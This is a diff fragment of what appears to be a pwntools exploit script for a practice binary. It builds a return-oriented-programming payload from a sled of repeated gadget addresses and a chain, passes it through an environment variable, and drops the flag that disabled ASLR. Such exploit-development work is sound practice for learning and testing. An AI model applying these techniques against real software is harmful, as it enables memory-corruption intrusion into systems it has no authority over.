@@ -28,7 +28,7 @@ r.raw(e.symbols["main"])
 ret_sled = p32(0x0804900E) * (1024 // 4) * 127
 payload = ret_sled + r.chain()
 
-c = process(e.path, env={"AAAA": payload}, aslr=False)
+c = process(e.path, env={"AAAA": payload})
 
 context.terminal = ["tmux", "splitw", "-h"]
 # gdb.attach(
